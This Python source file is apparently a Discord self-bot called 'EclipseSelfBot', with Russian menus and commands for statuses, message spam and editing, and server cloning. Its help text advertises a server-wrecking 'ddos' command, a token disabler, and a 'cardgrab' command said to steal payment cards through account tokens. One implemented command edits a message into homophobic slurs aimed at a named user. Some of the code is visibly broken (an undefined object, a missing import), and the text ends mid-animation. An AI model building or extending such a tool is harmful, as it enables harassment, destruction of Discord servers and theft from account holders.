import discord
import asyncio
import aiohttp
import io
import re
import config
import numpy
import random
import requests
import datetime
import time
import requests as rq
import colorama
colorama.init()
from colorama import Fore, Style
from datetime import datetime
from discord.ext import commands

# Settings
def error(text):
    print(f'{Fore.RED}[{time.strftime("%H:%M:%S")}] [ERROR] {text}{Style.RESET_ALL}')
def info(text):
    print(f'{Fore.GREEN}[{time.strftime("%H:%M:%S")}] [INFO] {text}{Style.RESET_ALL}')
def check(id):
    return id in [bot.user.id]#Allowed ids
def gcheck(ctx):return True#Метод удалён
def warn(text):
    print(f'{Fore.YELLOW}[{time.strftime("%H:%M:%S")}] [WARN] {text}{Style.RESET_ALL}')
def gettime():
	named_tuple = time.localtime()
	return time.strftime("%H:%M:%S", named_tuple)

token = "Вставь сюда токен"
deftext = "Death is it good for him, but death it exactly what he wants, isn't it, Mr.Afton...♡ | EclipseSelfBot ♡"
prefix = "#"
bot = commands.Bot(command_prefix = prefix, self_bot=True, intents=discord.Intents.all(), help_command=None)

@bot.event
async def on_ready():
	await bot.change_presence(activity=discord.Streaming(name=deftext, url='https://www.twitch.tv/eclipse_discord'), status=discord.Status.dnd)

	global banner
	banner = f"""

{Fore.LIGHTRED_EX}\
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             '''''''          ''''''''
{Fore.LIGHTMAGENTA_EX}┌─────────────────────────────────────────┐
│      ______     _ _                     │
│     |  ____|   | (_)                    │
│     | |__   ___| |_ _ __  ___  ___      │
│     |  __| / __| | | '_ \/ __|/ _ \     │
│     | |___| (__| | | |_) \__ \  __/     │
│     |______\___|_|_| .__/|___/\___|     │
│                    | |                  │
│                    |_|                  │
└─────────────────────────────────────────┘
	"""
	print(banner)
	msg = f"""
{Fore.RESET}{gettime()}  |  {Fore.LIGHTRED_EX}[Event] {Fore.RESET} |  {Fore.LIGHTMAGENTA_EX}Logged as: {Fore.LIGHTWHITE_EX}{bot.user.name}#{bot.user.discriminator}
{Fore.RESET}{gettime()}  |  {Fore.LIGHTRED_EX}[Event] {Fore.RESET} |  {Fore.LIGHTMAGENTA_EX}ID: {Fore.LIGHTWHITE_EX}{bot.user.id}
{Fore.RESET}{gettime()}  |  {Fore.LIGHTRED_EX}[Event] {Fore.RESET} |  {Fore.LIGHTMAGENTA_EX}Discriminator: {Fore.LIGHTWHITE_EX}{bot.user.discriminator}
{Fore.RESET}{gettime()}  |  {Fore.LIGHTRED_EX}[Event] {Fore.RESET} |  {Fore.LIGHTMAGENTA_EX}Prefix: {Fore.LIGHTWHITE_EX}{prefix}
	"""

	print(msg)
	line = "――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――"
	print(Fore.RESET+line)
	print('\n')

# Status
@bot.command()
async def musicstatus(ctx, *, text=deftext):
    if check(ctx.author.id):
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=text), status=discord.Status.dnd)
        await ctx.message.delete()
@bot.command()
async def gamestatus(ctx, *, text=deftext):
    if check(ctx.author.id):
        await bot.change_presence(activity=discord.Game(name=text), status=discord.Status.dnd)
        await ctx.message.delete()
@bot.command()
async def streamstatus(ctx, *, text=deftext):
    if check(ctx.author.id):
        await bot.change_presence(activity=discord.Streaming(name=text, url='https://www.twitch.tv/eclipse_discord'), status=discord.Status.dnd)
        await ctx.message.delete()
@bot.command()
async def watchingstatus(ctx, *, text=deftext):
    if check(ctx.author.id):
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=text), status=discord.Status.dnd)
        await ctx.message.delete()
@bot.command()
async def competingstatus(ctx, *, text=deftext):
    if check(ctx.author.id):
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.competing, name=text), status=discord.Status.dnd)
        await ctx.message.delete()         
@bot.command()
async def clearstatus(ctx):
    if check(ctx.author.id):
        await bot.change_presence(activity=None, status=discord.Status.dnd)
        await ctx.message.delete()

# HelpCommands
@bot.command()
async def help(ctx):
	await ctx.send(f'```xml\n<\n╭━━━╮╱╱╭╮\n┃╭━━╯╱╱┃┃\n┃╰━━┳━━┫┃╭┳━━┳━━┳━━╮\n┃╭━━┫╭━┫┃┣┫╭╮┃━━┫┃━┫\n┃╰━━┫╰━┫╰┫┃╰╯┣━━┃┃━┫\n╰━━━┻━━┻━┻┫╭━┻━━┻━━╯\n╱╱╱╱╱╱╱╱╱╱┃┃\n╱╱╱╱╱╱╱╱╱╱╰╯>```\n```xml\n< EclipseSelfBot -━Мощный селф-бот с большим функционалом и удобным интерфейсом. >```\n```xml\n< {ctx.prefix}Info - Информационные команды >\n< {ctx.prefix}Fun - Веселости и развлечения >\n< {ctx.prefix}Status - Красивый статус >\n< {ctx.prefix}Crash - Краш Команды >\n< {ctx.prefix}Nsfw - Эротика ♡ >\n< {ctx.prefix}Token - Работа с токенами >```\n```xml\n< EclipseSelfBot♡ - Все права защищены...♡ >```')

@bot.command()
async def Token(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Токены >```\n```xml\n< {ctx.prefix}disabler - отключение токена >\n< {ctx.prefix}tokeninfo - Информация и данные токена >\n< {ctx.prefix}checktoken - токен чекер >\n< {ctx.prefix}cardgrab - ворует платежку с токена >```\n```xml\n< EclipseSelfBot - Все права защищенны...♡ >```')
	
@bot.command()
async def Info(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Информация >```\n```xml\n< {ctx.prefix}avatar - Показать аватарку пользователя >\n< {ctx.prefix}ipinfo - Информация о IP-Адресе >\n< {ctx.prefix}ping - Пинг селф-бота >\n< {ctx.prefix}website - открыть гитхаб проекта >\n< {ctx.prefix}install - отправить ссылку на установку селф бота >```\n```xml\n< EclipseSelfBot - Все права защищены >```')

@bot.command()
async def Crash(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Краш >```\n```xml\n< {ctx.prefix}ddos - Краш сервера. Удаление всех каналов и ролей. Спам ролями. Спам каналами и мощный флуд в них за счет вебхука с большим количевством пингов >\n< {ctx.prefix}spam - Начать спам вашим текстом >\n< {ctx.prefix}stop - Остановить спам >```\n```xml\n< EclipseSelfBot - Все права защищенны...♡ >```')
	
@bot.command()
async def Fun(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Веселости >```\n```xml\n< {ctx.prefix}fbi - Участника повяжет ФСБ >\n< {ctx.prefix}flex - Танцы в чате >\n< {ctx.prefix}gay - Оскорбить участника >\n< {ctx.prefix}edit - Массовое редактирование >\n< {ctx.prefix}aboba - Редачит кол-во сообщений на ABOBA >\n< {ctx.prefix}hypesquad - Меняет ваш значок >\n< {ctx.prefix}rainbowrole - Радужная роль >\n< {ctx.prefix}stoprainbow - Остановить радужную роль >\n< {ctx.prefix}clone - Клонирование сервера >\n< {ctx.prefix}spamreact - ставит куча реакций на прошлое сообщение >```\n```xml\n< EclipseSelfBot♡ - Все права защищны...♡ >```')
	
@bot.command()
async def Status(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Статусы >```\n```xml\n< {ctx.prefix}streamstatus - Статус"Стримит" >\n< {ctx.prefix}musicstatus - Статус"Слушает" >\n< {ctx.prefix}gamestatus - Статус"Играет" >\n< {ctx.prefix}watchingstatus - Статус"Смотрит" >\n< {ctx.prefix}competingstatis - Статус"Соревнуется" >\n< {ctx.prefix}clearstatus - Очистить статус >```\n```xml\n< EclipseSelfBot♡ - Все првва защищены...♡ >```')

@bot.command()
async def Nsfw(ctx):
	await ctx.send(f'```xml\n< EclipseSelfBot | Nsfw >```\n```xml\n< {ctx.prefix}cum - cumкейк.>\n< {ctx.prefix}lesbian - лесбиянки.>\n< {ctx.prefix}anal - развлечения. >\n< {ctx.prefix}tits - сiсяндрi. >\n< {ctx.prefix}blowjob - минет. >```\n```xml\n< EclipseSelfBot - Все права защищены...♡ >```')
# Fun
@bot.command()
async def gay(ctx, user="‌‌"):
    await ctx.message.delete()
    message=await ctx.send(f'> Ты {user}')
    time.sleep(0.5)
    await message.edit(content='> Ебаный')
    time.sleep(0.5)
    await message.edit(content=f'> Гондон')
    time.sleep(0.5)
    await message.edit(content=f'> Пидор {user}')
    time.sleep(1)
    await message.edit(content='> Мать ебал')

@bot.command()
async def aboba(ctx, count=None):
    await ctx.message.delete()
    if count == None:
        randcolor=random.randint(0x000000, 0xFFFFFF)
        await ctx.send(f'```xml\n< Вы не ввели кол-во сообщений или текст для замены.\n{prefix.strip()}Редактирование [кол-во] [текст] >```')
    else:
        edited=0
        randcolor=random.randint(0x000000, 0xFFFFFF)
        msg=await ctx.send(f'```xml\n< Редактирование прошло успешно >```')
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == bot.user:
                    if message != msg:
                        await message.edit(content=":a:" ":b:" ":o2:" ":b:" ":a:", embed=None)
                        edited=edited + 1
            except:
                pass
                
@bot.command()
async def edit(ctx, count=None, *, mesg=None):
    await ctx.message.delete()
    if count == None or mesg == None:
        randcolor=random.randint(0x000000, 0xFFFFFF)
        await ctx.send(f'```xml\n< Вы не ввели кол-во сообщений или текст для замены.\n{prefix.strip()}Редактирование [кол-во] [текст] >```')
    else:
        edited=0
        randcolor=random.randint(0x000000, 0xFFFFFF)
        msg=await ctx.send(f'```xml\n< Редактирование прошло успешно >```')
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == bot.user:
                    if message != msg:
                        await message.edit(content=mesg, embed=None)
                        edited=edited + 1
            except:
                pass

@bot.command()
async def hypesquad(ctx, house):  # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online',
                     headers=headers, json=payload, timeout=10)
    except Exception as e:
        embed = discord.Embed(
            description=f"{e}",
            color=0xff0000
        )
        await ctx.send(f"*Произошла ошибка:*", embed=embed)
               
@bot.command()
async def rainbowrole(ctx):
	await ctx.message.delete()
	pos = ctx.message.author.top_role.position
	role = await ctx.guild.create_role(name = "Eclipse♡ Self bot")
	colors = [0, 0x1abc9c, 0x11806a,
			0x2ecc71, 0x1f8b4c,
			0x3498db, 0x206694, 0x9b59b6, 0x71368a, 0xe91e63, 0xad1457,
			0xf1c40f, 0xc27c0e, 0xe67e22, 0xa84300, 0xe74c3c, 0x992d22,
			0x95a5a6, 0x607d8b, 0x979c9f, 0x546e7a, 0x7289da, 0x99aab5]
	global rain
	rain = True
	global true
	true = True
	global false
	false = False
	while rain:
		for i in colors:
			await role.edit(color = discord.Colour(i))
			await asyncio.sleep(0.5)

@bot.command()
async def stoprainbow(ctx):
	rain = false
	await ctx.send(f'```xml\n< Радужная роль остановлена >```')
	
@bot.command()
async def spamreact(ctx): 
	await ctx.message.delete()
	tuple = ('🍏', '🍎', '🍐', '🍊',
	'🍋', '🍌', '🍉', '🍇', '🍓', '🍈', '🍒', '🍑', '🥭',
	'🍍', '🥥', '🥝', '🍅', '🍆', '🥑', '🥦', '🥬' '🥒',
	'🌶', '🌽', '🥕', '🧄', '🧅', '🥔', '🍠', '🥐', '🥯',
	'🍞', '🥖', '🥨', '🧀', '🥚', '🍳', '🧈', '🥞', '🧇',
	'🥓', '🥩' '🍗', '🍖', '🦴', '🌭', '🍔', '🍟', '🍕',
	'🥪', '🥙', '🧆', '🌮', '🌯', '🥗', '🥘', '🥫', '🍝', '🍜', '🍲',
	'🍛', '🍣', '🍱', '🥟', '🦪', '🍤', '🍙', '🍚', '🍘', '🍥',
	'🥠', '🥮', '🍢', '🍡', '🍧', '🍨', '🍦', '🥧', '🧁', '🍰', '🎂', '🍮', '🍭',
	'🍬', '🍫', '🍿', '🍩', '🍪', '🌰', '🥜', '🍯', '🥛', '🍼', '☕️', '🍵', '🧃', '🥤', '🍶',
	'🍺', '🍻', '🥂', '🍷', '🥃', '🍸', '🍹', '🧉', '🍾', '🧊', '🥄', '🍴', '🍽', '🥣', '🥡', '🥢', '🧂')   
	async for message in ctx.message.channel.history(limit=1):
		for i in tuple:
			try:
				await message.add_reaction(i)
			except:
				pass

@bot.command()
async def clone(ctx):
    if not ctx.guild: return
    timel = time.time()
    guild = ctx.guild
    msglog=ctx.message
    icon_hash = guild.icon
    with open('clone_icon.png', 'wb+') as handle:
        handle.write(rq.get(f'https://cdn.discordapp.com/icons/{guild.id}/{icon_hash}.png').content)
    new_guild = await Alucard.create_guild(name=f'[CLONE] {guild.name}', icon=open('clone_icon.png', 'rb').read())
    for dc in new_guild.channels:
        await dc.delete()
    roles = {}
    r = guild.roles
    r.reverse()
    for role in r:
        if role.is_bot_managed() or role.is_default() or role.is_integration() or role.is_premium_subscriber(): continue
        new_role=await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
        roles[role] = new_role
    everyone = guild.default_role
    roles[everyone] = new_guild.default_role
    await new_guild.default_role.edit(permissions=everyone.permissions, color=everyone.color, hoist=everyone.hoist, mentionable=everyone.mentionable)
    for dc in await new_guild.fetch_channels():
        await dc.delete()
    channels = {None: None}
    for cat in guild.categories:
        new_c = await new_guild.create_category(name=cat.name, position=cat.position)
        channels[cat] = new_c
    for catt in guild.by_category():
        cat = catt[0]
        chs = catt[1]
        if cat != None:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=channels[c.category], position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=channels[c.category], position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
        else:
            for c in chs:
                if c.type==discord.ChannelType.text:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                elif c.type==discord.ChannelType.voice:
                    new_c = await new_guild.create_voice_channel(name=c.name, category=None, position=c.position, user_limit=c.user_limit)
                elif c.type==discord.ChannelType.news:
                    new_c = await new_guild.create_text_channel(name=c.name, category=None, position=c.position, topic=c.topic, slowmode_delay=c.slowmode_delay, nsfw=c.nsfw)
                channels[c] = new_c
    for c in guild.channels:
        overs = c.overwrites
        over_new = {}
        for target,over in overs.items():
            if isinstance(target, discord.Role):
                try:
                    over_new[roles[target]] = over
                except:
                    pass
            else:
                pass
        await channels[c].edit(overwrites=over_new)
    await new_guild.edit(verification_level=guild.verification_level, default_notifications=guild.default_notifications, explicit_content_filter=guild.explicit_content_filter, system_channel=channels[guild.system_channel], system_channel_flags=guild.system_channel_flags, afk_channel=channels[guild.afk_channel], afk_timeout=guild.afk_timeout)#это не оверврайт, но лучше его делать перед эмодзи
    for emoji in guild.emojis:
        try:
            url = f'https://cdn.discordapp.com/emojis/{emoji.id}.{"gif" if emoji.animated else "png"}'
            await new_guild.create_custom_emoji(name=emoji.name, image=rq.get(url).content)
        except:
            pass
    os.remove('clone_icon.png')
    times = int(time.time() - timel)
    
@bot.command()
async def flex(ctx):
    await ctx.message.delete()
    message=await ctx.send("""```xml
<
    ⣀⣤
⠀⠀⠀⠀⣿⠿⣶
⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⣶⣶⣿⠿⠛⣶
⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
⠀⠀⠀⠛⠛
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
      ⣀⣶⣀
⠀⠀⠀⠒⣛⣭
⠀⠀⠀⣀⠿⣿⣶
⠀⣤⣿⠤⣭⣿⣿
⣤⣿⣿⣿⠛⣿⣿⠀⣀
⠀⣀⠤⣿⣿⣶⣤⣒⣛
⠉⠀⣀⣿⣿⣿⣿⣭⠉
⠀⠀⣭⣿⣿⠿⠿⣿
⠀⣶⣿⣿⠛⠀⣿⣿
⣤⣿⣿⠉⠤⣿⣿⠿
⣿⣿⠛⠀⠿⣿⣿
⣿⣿⣤⠀⣿⣿⠿
⠀⣿⣿⣶⠀⣿⣿⣶
⠀⠀⠛⣿⠀⠿⣿⣿
⠀⠀⠀⣉⣿⠀⣿⣿
⠀⠶⣶⠿⠛⠀⠉⣿
⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⣶⣿⠿
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⣀
⠀⠿⣿⣿⣀
⠀⠉⣿⣿⣀
⠀⠀⠛⣿⣭⣀⣀⣤
⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
⣀⣶⣿⠛
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉
⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿
⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀
⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⠀⠀⣤⣶⣶
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⠤⣿⠿⠿⠿
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⣀
⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣤⣤⣤⣿⣿⣿
⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣶
⠀⠀⠀⠀⣿⠉⠿⣿⣿
⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
⠀⠀⠀⠀⠀⠀⣿⠛
⠀⠀⠀⠀⠀⠀⣭⣶
>```""")
    await asyncio.sleep(1)
    await message.edit(content="""```xml
<
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
